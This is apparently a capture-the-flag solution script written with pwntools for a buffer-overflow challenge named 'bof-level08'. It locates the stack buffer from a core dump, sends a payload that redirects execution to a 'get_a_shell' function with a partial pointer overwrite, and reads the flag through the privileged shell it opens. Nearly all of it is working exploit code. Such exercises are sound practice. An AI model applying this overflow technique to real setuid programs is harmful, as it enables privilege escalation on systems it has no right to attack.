# SETUP BOILERPLATE
from pwn import *
import os

DEBUG = False # toggles gdb.debug or process
elf = ELF('./bof-level08') # replace this with the actual level

# crash the process to get a core file and find the buffer address (still boilerplate)
io = elf.process(env={}, setuid=False)
io.sendline(cyclic(10000)) # send 1000 junk characters
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(50))
os.unlink(core.path) # delete the file now that we're done with it

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={"a":"a"*32}, gdbscript='''
    b *0x0000000000400727
    continue
    ''')
else:
    io = elf.process(env={"a":"a"*32})

# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE
get_a_shell = p64(elf.symbols["get_a_shell"])

max_len = 129
offset = 0x20 - 0x40

print(buffer_address)
payload = b"a" * 8 + get_a_shell + (max_len - 16 - 1) * b"a" + p64(buffer_address + offset)[0:1]

io.sendline(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
